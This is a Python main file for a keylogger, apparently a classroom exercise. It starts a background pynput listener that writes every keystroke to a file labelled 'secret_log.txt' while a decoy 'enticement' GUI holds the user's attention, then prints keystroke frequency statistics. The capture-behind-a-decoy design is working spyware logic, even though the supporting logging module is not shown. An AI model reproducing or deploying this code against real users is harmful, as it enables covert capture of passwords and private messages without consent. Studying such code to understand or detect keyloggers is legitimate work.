#This File Contains the Keylogger Implementation Using the Logging Utilities and User Interface.
#It should create an instance of KeyLogger and UserInterface to log keystrokes.


try:
    from pynput import keyboard
except ImportError as e:
    raise ImportError("pynput module not found. Install it using: pip install pynput") from e

from logging_tools import KeyLogger, UserInterface

def display_session_summary(logger):
    """Display summary statistics of captured keystroke data using loops"""
    print("\n" + "="*50)
    print("SESSION SUMMARY - KEYSTROKE ANALYSIS")
    print("="*50)
    
    stats = logger.get_session_stats()
    
    # Display total keystrokes
    print(f"\nTotal Keystrokes Captured: {stats['total_keys']}")
    
    # Loop through key frequency dictionary and display top 5 most used keys
    print("\nTop 5 Most Used Keys:")
    sorted_keys = sorted(stats['key_frequency'].items(), key=lambda x: x[1], reverse=True)
    for idx, (key, count) in enumerate(sorted_keys[:5], 1):
        percentage = (count / stats['total_keys'] * 100) if stats['total_keys'] > 0 else 0
        print(f"  {idx}. {key}: {count} times ({percentage:.1f}%)")
    
    # Loop through recent key sequences
    print("\nLast 10 Captured Key Sequences:")
    for idx, sequence in enumerate(stats['recent_keys'], 1):
        print(f"  [{idx}] {sequence['key']} - {sequence['time']}")
    
    print("\n" + "="*50)

def main():
    # 1. Initialize our components
    logger = KeyLogger("secret_log.txt") # Background "secret" file
    ui = UserInterface()
    
    # 2. Define the listener behavior
    def on_press(key):
        logger.process_key(key)
    
    # 3. Start the keyboard listener in a non-blocking background thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # 4. Display the GUI (This blocks the main thread until the window is closed)
    ui.start_enticement()
    
    # 5. Cleanup once the UI window is closed
    listener.stop()
    print("Session ended. Data saved to public_notes.txt and secret_log.txt.")
    
    # 6. Display session statistics with explicit loop functionality
    display_session_summary(logger)

if __name__ == "__main__":
    main()